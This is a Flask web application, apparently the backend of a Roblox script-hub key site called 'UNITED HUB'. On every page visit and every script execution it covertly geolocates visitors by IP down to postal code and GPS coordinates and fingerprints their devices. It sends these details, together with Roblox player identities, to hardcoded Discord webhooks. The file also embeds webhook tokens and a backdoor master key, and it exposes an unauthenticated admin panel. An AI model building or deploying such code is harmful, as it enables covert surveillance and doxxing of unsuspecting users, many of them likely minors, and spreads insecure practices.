import os
import logging
import requests
from flask import Flask, request, render_template, redirect, url_for, session, jsonify
from werkzeug.middleware.proxy_fix import ProxyFix
from user_agents import parse
from datetime import datetime, timedelta
import hashlib
import time
import random
import string
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.orm import DeclarativeBase

# Configure logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

class Base(DeclarativeBase):
    pass

db = SQLAlchemy(model_class=Base)

# Create the app
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "dev-secret-key")
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)

# Database configuration
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get("DATABASE_URL")
app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
    "pool_recycle": 300,
    "pool_pre_ping": True,
}
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize database
db.init_app(app)

# Discord webhook configuration
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1396961102344097865/H3vvRcT3yYWPg4VKFwjaaqVqEe2dtnb21r3Ib7gCYbsRRkhqyARNxiakvIhACI8Rc1kf")  # Chat geral
KEY_GENERATOR_WEBHOOK_URL = "https://discord.com/api/webhooks/1396961179624280234/tg6NSzLM1SKRvENJpUBRE2pJSKuEeCx02Gmg2ltT3m2_44DWyGdVQEeqsd7lqLb2JHaI"
DM_NOTIFICATION_WEBHOOK_URL = "https://discord.com/api/webhooks/1396969880242360360/XruAYI9J183iqMLLAg5L6qztulQ_rvphaz-Xd2BWhmYUifGqpcZa-Gx-C10VPUmFo51m"

# Webhooks específicos para verificação
VERIFICACAO_CORRETA_WEBHOOK_URL = os.getenv("VERIFICACAO_CORRETA_WEBHOOK", "https://discord.com/api/webhooks/1397602836056899704/_Xbp84UkGlxgTRQ1y4L4nHNH3XFe9MseCnBBX1KlB3Z-YZyRIxvmGMWaKtoS8DF8xcpt")
VERIFICACAO_ERRO_WEBHOOK_URL = os.getenv("VERIFICACAO_ERRO_WEBHOOK", "https://discord.com/api/webhooks/1397603091590942872/MnpJduyS1XbKv-yhNUPlOupI8sXJqs3PKW2kUtGYmAv4spoXJhyQRq4jbGH1_iEeK5Us")

# Secret key for API authentication
API_SECRET_KEY = os.getenv("API_SECRET_KEY", "your-secret-api-key-here")

# Dictionary to track recent notifications (IP + timestamp)
recent_notifications = {}

# Import models after app creation
with app.app_context():
    from models import PrivateKey
    db.create_all()

def should_send_notification(ip, notification_type, cooldown_minutes=5):
    """Check if we should send a notification based on cooldown"""
    key = f"{ip}_{notification_type}"
    current_time = time.time()
    
    # Clean old entries (older than 1 hour)
    keys_to_remove = []
    for k, timestamp in recent_notifications.items():
        if current_time - timestamp > 3600:  # 1 hour
            keys_to_remove.append(k)
    
    for k in keys_to_remove:
        del recent_notifications[k]
    
    # Check if we should send notification
    if key in recent_notifications:
        time_diff = current_time - recent_notifications[key]
        if time_diff < (cooldown_minutes * 60):  # Convert to seconds
            return False
    
    # Update timestamp
    recent_notifications[key] = current_time
    return True

def get_client_ip():
    """Get the real IP address of the client, considering proxies"""
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers.get('X-Real-IP')
    else:
        ip = request.remote_addr
    return ip

def get_detailed_location_info(ip_address):
    """Get comprehensive location information from multiple APIs"""
    location_data = {
        'ip': ip_address,
        'country': 'Desconhecido',
        'country_code': 'N/A',
        'region': 'Desconhecido', 
        'city': 'Desconhecido',
        'postal_code': 'N/A',
        'latitude': 'N/A',
        'longitude': 'N/A',
        'timezone': 'N/A',
        'isp': 'Desconhecido',
        'org': 'Desconhecido',
        'as_name': 'N/A',
        'formatted_location': 'Localização não disponível'
    }
    
    # Skip localhost/private IPs
    if ip_address in ['127.0.0.1', 'localhost'] or ip_address.startswith('192.168.') or ip_address.startswith('10.'):
        logger.info(f"Skipping location lookup for private IP: {ip_address}")
        location_data['formatted_location'] = 'IP Local/Privado'
        return location_data
    
    # Try multiple APIs for maximum data coverage
    apis_to_try = [
        {
            'name': 'IP-API',
            'url': f'http://ip-api.com/json/{ip_address}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query',
            'parser': 'ipapi'
        },
        {
            'name': 'IPInfo',
            'url': f'https://ipinfo.io/{ip_address}/json',
            'parser': 'ipinfo'
        }
    ]
    
    for api in apis_to_try:
        try:
            logger.info(f"Tentando {api['name']} para IP {ip_address}")
            response = requests.get(api['url'], timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                if api['parser'] == 'ipapi' and data.get('status') == 'success':
                    location_data.update({
                        'country': data.get('country', 'Desconhecido'),
                        'country_code': data.get('countryCode', 'N/A'),
                        'region': data.get('regionName', 'Desconhecido'),
                        'city': data.get('city', 'Desconhecido'),
                        'postal_code': data.get('zip', 'N/A'),
                        'latitude': str(data.get('lat', 'N/A')),
                        'longitude': str(data.get('lon', 'N/A')),
                        'timezone': data.get('timezone', 'N/A'),
                        'isp': data.get('isp', 'Desconhecido'),
                        'org': data.get('org', 'Desconhecido'),
                        'as_name': data.get('as', 'N/A')
                    })
                    
                    # Format complete location
                    location_parts = []
                    if data.get('city') and data.get('city') != 'N/A':
                        location_parts.append(data['city'])
                    if data.get('regionName') and data.get('regionName') != 'N/A':
                        location_parts.append(data['regionName'])
                    if data.get('country') and data.get('country') != 'N/A':
                        location_parts.append(data['country'])
                    
                    location_data['formatted_location'] = ', '.join(location_parts) if location_parts else 'Localização não disponível'
                    logger.info(f"Dados obtidos com sucesso de {api['name']}")
                    break
                    
                elif api['parser'] == 'ipinfo' and 'city' in data:
                    loc = data.get('loc', 'N/A,N/A').split(',')
                    location_data.update({
                        'country': data.get('country', 'Desconhecido'),
                        'region': data.get('region', 'Desconhecido'),
                        'city': data.get('city', 'Desconhecido'),
                        'postal_code': data.get('postal', 'N/A'),
                        'latitude': loc[0] if len(loc) > 0 else 'N/A',
                        'longitude': loc[1] if len(loc) > 1 else 'N/A',
                        'timezone': data.get('timezone', 'N/A'),
                        'org': data.get('org', 'Desconhecido')
                    })
                    
                    # Format complete location
                    location_parts = []
                    if data.get('city'):
                        location_parts.append(data['city'])
                    if data.get('region'):
                        location_parts.append(data['region'])
                    if data.get('country'):
                        location_parts.append(data['country'])
                    
                    location_data['formatted_location'] = ', '.join(location_parts) if location_parts else 'Localização não disponível'
                    logger.info(f"Dados obtidos com sucesso de {api['name']}")
                    break
                    
        except requests.exceptions.RequestException as e:
            logger.warning(f"Falha ao obter localização de {api['name']}: {str(e)}")
            continue
        except Exception as e:
            logger.error(f"Erro ao processar dados de {api['name']}: {str(e)}")
            continue
    
    return location_data

def get_comprehensive_device_info():
    """Get comprehensive device, browser, and system information"""
    try:
        user_agent_string = request.headers.get('User-Agent', '')
        user_agent = parse(user_agent_string)
        
        # Get OS info
        os_family = user_agent.os.family or 'Desconhecido'
        os_version = user_agent.os.version_string or 'N/A'
        
        # Get browser info
        browser_family = user_agent.browser.family or 'Desconhecido'
        browser_version = user_agent.browser.version_string or 'N/A'
        
        # Device detection
        device_type = "Móvel" if user_agent.is_mobile else "Desktop"
        if user_agent.is_tablet:
            device_type = "Tablet"
        elif user_agent.is_bot:
            device_type = "Bot/Crawler"
        
        # Format detailed OS info
        os_info = f"{os_family}"
        if os_version and os_version != 'N/A':
            os_info += f" {os_version}"
            
        # Format detailed browser info
        browser_info = f"{browser_family}"
        if browser_version and browser_version != 'N/A':
            browser_info += f" {browser_version}"
        
        # Generate device fingerprint
        fingerprint_data = f"{user_agent_string}{request.headers.get('Accept-Language', '')}{request.headers.get('Accept-Encoding', '')}"
        device_fingerprint = hashlib.md5(fingerprint_data.encode()).hexdigest()[:12]
        
        # Get additional headers
        headers_info = {
            'accept_language': request.headers.get('Accept-Language', 'N/A'),
            'accept_encoding': request.headers.get('Accept-Encoding', 'N/A'),
            'connection': request.headers.get('Connection', 'N/A'),
            'cache_control': request.headers.get('Cache-Control', 'N/A'),
            'dnt': request.headers.get('DNT', 'N/A')
        }
        
        return {
            'user_agent': user_agent_string,
            'os_family': os_family,
            'os_version': os_version,
            'os_info': os_info,
            'browser_family': browser_family,
            'browser_version': browser_version,
            'browser_info': browser_info,
            'device_type': device_type,
            'is_mobile': user_agent.is_mobile,
            'is_tablet': user_agent.is_tablet,
            'is_bot': user_agent.is_bot,
            'device_fingerprint': device_fingerprint,
            'headers': headers_info
        }
        
    except Exception as e:
        logger.error(f"Erro ao obter informações do dispositivo: {str(e)}")
        return {
            'user_agent': 'Erro ao detectar',
            'os_info': 'Desconhecido',
            'browser_info': 'Desconhecido',
            'device_type': 'Desconhecido',
            'device_fingerprint': 'N/A',
            'headers': {}
        }

def send_discord_notification(webhook_url, message, username="UNITED HUB Monitor"):
    """Send notification to Discord webhook"""
    try:
        payload = {
            "username": username,
            "content": message
        }
        
        response = requests.post(webhook_url, json=payload, timeout=10)
        if response.status_code in [200, 204]:
            logger.info("Notificação Discord enviada com sucesso")
            return True
        else:
            logger.warning(f"Falha ao enviar notificação Discord: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        logger.error(f"Erro ao enviar notificação Discord: {str(e)}")
        return False

def generate_unique_key(length=16):
    """Generate a unique key that doesn't exist in the database"""
    while True:
        # Generate random key
        characters = string.ascii_uppercase + string.digits
        key = ''.join(random.choice(characters) for _ in range(length))
        
        # Check if key already exists
        existing_key = PrivateKey.query.filter_by(key=key).first()
        if not existing_key:
            return key

def is_key_valid(key):
    """Check if a key is valid (exists and not expired)"""
    # Check master key first
    if key == "SEMNEXO134":
        return True
    
    # Check database keys
    private_key = PrivateKey.query.filter_by(key=key).first()
    if private_key:
        if private_key.expires_at > datetime.utcnow():
            return True
        else:
            # Key expired, remove it
            db.session.delete(private_key)
            db.session.commit()
            return False
    
    return False

@app.route('/')
def index():
    """Main page with access tracking and key verification"""
    ip = get_client_ip()
    location = get_detailed_location_info(ip)
    device = get_comprehensive_device_info()
    
    # Send notification if not in cooldown
    if should_send_notification(ip, 'site_access'):
        # Create detailed message for DM webhook
        dm_message = f"""🌐 **NOVO ACESSO AO SITE - UNITED HUB**

👤 **LOCALIZAÇÃO DETALHADA**
🌍 IP: {location['ip']}
📍 Localização Completa: {location['formatted_location']}
🏙️ Cidade: {location['city']}
🏛️ Estado/Região: {location['region']}
🌎 País: {location['country']} ({location['country_code']})
📮 CEP: {location['postal_code']}
📍 Coordenadas GPS: {location['latitude']}, {location['longitude']}
🕰️ Timezone: {location['timezone']}
🌐 Provedor (ISP): {location['isp']}
🏢 Organização: {location['org']}
📡 AS Network: {location['as_name']}

💻 **DISPOSITIVO USADO**
🖥️ Sistema: {device['os_info']}
🌐 Navegador: {device['browser_info']}
📱 Tipo: {device['device_type']}
🔍 Device ID: {device['device_fingerprint']}
🗣️ Idioma: {device['headers']['accept_language']}

⏰ **Timestamp:** {datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S')} UTC
🔥 **STATUS:** SITE ACESSADO"""

        # Send to DM webhook
        send_discord_notification(DM_NOTIFICATION_WEBHOOK_URL, dm_message)
    
    return render_template('hub.html')

@app.route('/verify', methods=['POST'])
def verify_key():
    """Verify access key"""
    ip = get_client_ip()
    location = get_detailed_location_info(ip)
    device = get_comprehensive_device_info()
    
    key = request.form.get('key', '').strip().upper()
    
    if is_key_valid(key):
        # Success - send notification to verification success channel
        success_message = f"""✅ **VERIFICAÇÃO APROVADA - UNITED HUB**

🔑 **Key:** {key}
👤 **IP:** {location['ip']}
📍 **Localização:** {location['formatted_location']}
💻 **Dispositivo:** {device['os_info']} - {device['browser_info']}
⏰ **Horário:** {datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S')} UTC

🎯 **STATUS:** ACESSO LIBERADO"""

        # Send to verification success channel
        send_discord_notification(VERIFICACAO_CORRETA_WEBHOOK_URL, success_message)
        
        return render_template('verified.html')
    else:
        # Failed - send notification to verification error channel
        fail_message = f"""❌ **VERIFICAÇÃO FALHADA - UNITED HUB**

🔑 **Key Tentativa:** {key}
👤 **IP:** {location['ip']}
📍 **Localização:** {location['formatted_location']}
💻 **Dispositivo:** {device['os_info']} - {device['browser_info']}
⏰ **Horário:** {datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S')} UTC

🎯 **STATUS:** KEY INVÁLIDA OU EXPIRADA"""

        # Send to verification error channel
        send_discord_notification(VERIFICACAO_ERRO_WEBHOOK_URL, fail_message)
        
        return render_template('denied.html')

@app.route('/generate-key')
def generate_public_key():
    """Generate a public key for testing"""
    new_key = generate_unique_key()
    expires_at = datetime.utcnow() + timedelta(hours=24)
    
    # Save to database
    private_key = PrivateKey(
        key=new_key,
        user_id="public_generation",
        username="Sistema Público",
        expires_at=expires_at
    )
    db.session.add(private_key)
    db.session.commit()
    
    # Send notification
    notification_message = f"""🔑 **KEY PÚBLICA GERADA**

**🎯 Key:** `{new_key}`
**⏰ Expira:** {expires_at.strftime('%d/%m/%Y %H:%M')} UTC
**🕒 Duração:** 24 horas
**👤 Gerada por:** Sistema Público

⚠️ **Esta é uma key de teste pública**"""

    send_discord_notification(KEY_GENERATOR_WEBHOOK_URL, notification_message)
    
    return jsonify({
        'success': True,
        'key': new_key,
        'expires_at': expires_at.isoformat(),
        'expires_formatted': expires_at.strftime('%d/%m/%Y às %H:%M UTC'),
        'message': 'Key pública gerada com sucesso'
    })

@app.route('/api/generate-private-key', methods=['POST'])
def generate_private_key():
    """API endpoint to generate private keys for Discord bot"""
    # Check authentication
    auth_header = request.headers.get('Authorization')
    if not auth_header or not auth_header.startswith('Bearer '):
        return jsonify({'error': 'Authorization header required'}), 401
    
    token = auth_header.split(' ')[1]
    if token != API_SECRET_KEY:
        return jsonify({'error': 'Invalid API key'}), 401
    
    # Get user data
    data = request.get_json()
    if not data or 'user_id' not in data or 'username' not in data:
        return jsonify({'error': 'user_id and username required'}), 400
    
    user_id = data['user_id']
    username = data['username']
    
    # Generate unique key
    new_key = generate_unique_key()
    expires_at = datetime.utcnow() + timedelta(hours=24)
    
    # Save to database
    private_key = PrivateKey(
        key=new_key,
        user_id=user_id,
        username=username,
        expires_at=expires_at
    )
    db.session.add(private_key)
    db.session.commit()
    
    # Send notification
    notification_message = f"""🔑 **KEY PRIVADA GERADA PARA DISCORD**

**🎯 Key:** `{new_key}`
**👤 Usuário:** {username} ({user_id})
**⏰ Expira:** {expires_at.strftime('%d/%m/%Y %H:%M')} UTC
**🕒 Duração:** 24 horas

🤖 **Gerada via Discord Bot**"""

    send_discord_notification(KEY_GENERATOR_WEBHOOK_URL, notification_message)
    
    return jsonify({
        'success': True,
        'key': new_key,
        'expires_at': expires_at.isoformat(),
        'expires_formatted': expires_at.strftime('%d/%m/%Y às %H:%M UTC'),
        'user_id': user_id,
        'username': username,
        'message': f'Key privada gerada para {username}'
    })

@app.route('/api/roblox-execution', methods=['POST'])
def roblox_execution():
    """Handle Roblox script execution data"""
    try:
        # Get client IP and location
        ip = get_client_ip()
        location = get_detailed_location_info(ip)
        device = get_comprehensive_device_info()
        
        # Get Roblox data
        roblox_data = request.get_json()
        
        if not roblox_data:
            return jsonify({'error': 'No data received'}), 400
        
        # Create detailed Discord message
        main_message = f"""🎮 **SCRIPT ROBLOX EXECUTADO - UNITED HUB**

👤 **DADOS DO JOGADOR**
🆔 Nome: {roblox_data.get('player_name', 'N/A')}
📛 Nome Display: {roblox_data.get('player_display_name', 'N/A')}
🔢 ID do Jogador: {roblox_data.get('player_id', 'N/A')}
⏳ Idade da Conta: {roblox_data.get('account_age', 'N/A')} dias
💎 Membership: {roblox_data.get('membership_type', 'N/A')}

🎯 **DADOS DO JOGO**
🎮 ID do Jogo: {roblox_data.get('game_id', 'N/A')}
🏠 Place ID: {roblox_data.get('place_id', 'N/A')}
📝 Nome do Jogo: {roblox_data.get('game_name', 'N/A')}
🌐 Server ID: {roblox_data.get('server_id', 'N/A')[:20]}...
🌍 Região do Server: {roblox_data.get('server_region', 'N/A')}

💻 **INFORMAÇÕES TÉCNICAS**
📱 Plataforma: {roblox_data.get('platform', 'N/A')}
📲 Mobile: {'Sim' if roblox_data.get('is_mobile') else 'Não'}
🎮 Gamepad: {'Sim' if roblox_data.get('is_gamepad') else 'Não'}
⌨️ Teclado: {'Sim' if roblox_data.get('is_keyboard') else 'Não'}
🥽 VR: {'Sim' if roblox_data.get('is_vr') else 'Não'}
🎨 Qualidade Gráfica: {roblox_data.get('graphics_quality', 'N/A')}
💾 Uso de Memória: {roblox_data.get('memory_usage', 'N/A')} MB

🌐 **LOCALIZAÇÃO REAL DO JOGADOR**
🌍 IP: {location['ip']}
📍 Localização Completa: {location['formatted_location']}
🏙️ Cidade: {location['city']}
🏛️ Estado/Região: {location['region']}
🌎 País: {location['country']} ({location['country_code']})
📮 CEP: {location['postal_code']}
📍 Coordenadas GPS: {location['latitude']}, {location['longitude']}
🕰️ Timezone: {location['timezone']}
🌐 Provedor (ISP): {location['isp']}

💻 **DISPOSITIVO USADO**
🖥️ Sistema: {device['os_info']}
🌐 Navegador: {device['browser_info']}
📱 Tipo: {device['device_type']}
🔍 Device ID: {device['device_fingerprint']}

⏰ **Timestamp:** {roblox_data.get('formatted_time', datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S'))}
🔥 **STATUS:** SCRIPT EXECUTADO COM SUCESSO"""

        # Create simplified DM message
        dm_message = f"""🎮 **NOVO SCRIPT EXECUTADO**

👤 Jogador: {roblox_data.get('player_name', 'N/A')} ({roblox_data.get('player_id', 'N/A')})
🎯 Jogo: {roblox_data.get('game_name', 'N/A')} ({roblox_data.get('place_id', 'N/A')})
🌍 Localização: {location['formatted_location']}
💻 Dispositivo: {device['os_info']} - {device['browser_info']}
⏰ Horário: {roblox_data.get('formatted_time', datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S'))}"""

        # Send to both webhooks
        send_discord_notification(DISCORD_WEBHOOK_URL, main_message)
        send_discord_notification(DM_NOTIFICATION_WEBHOOK_URL, dm_message)
        
        return jsonify({
            'success': True,
            'message': 'Dados recebidos e processados com sucesso',
            'player': roblox_data.get('player_name', 'N/A'),
            'location': location['formatted_location']
        })
        
    except Exception as e:
        logger.error(f"Erro ao processar dados do Roblox: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/admin')
def admin():
    """Admin panel to view keys"""
    keys = PrivateKey.query.order_by(PrivateKey.created_at.desc()).all()
    return render_template('admin.html', keys=keys)

@app.route('/cleanup-keys')
def cleanup_keys():
    """Remove expired keys"""
    expired_keys = PrivateKey.query.filter(PrivateKey.expires_at < datetime.utcnow()).all()
    count = len(expired_keys)
    
    for key in expired_keys:
        db.session.delete(key)
    
    db.session.commit()
    
    return jsonify({
        'success': True,
        'cleaned_keys': count,
        'message': f'{count} keys expiradas foram removidas'
    })

@app.errorhandler(404)
def not_found(error):
    return render_template('error.html', 
                         error_title="Página não encontrada",
                         error_message="A página que você está procurando não existe."), 404

@app.errorhandler(500)
def internal_error(error):
    return render_template('error.html',
                         error_title="Erro interno do servidor",
                         error_message="Ocorreu um erro interno. Tente novamente."), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
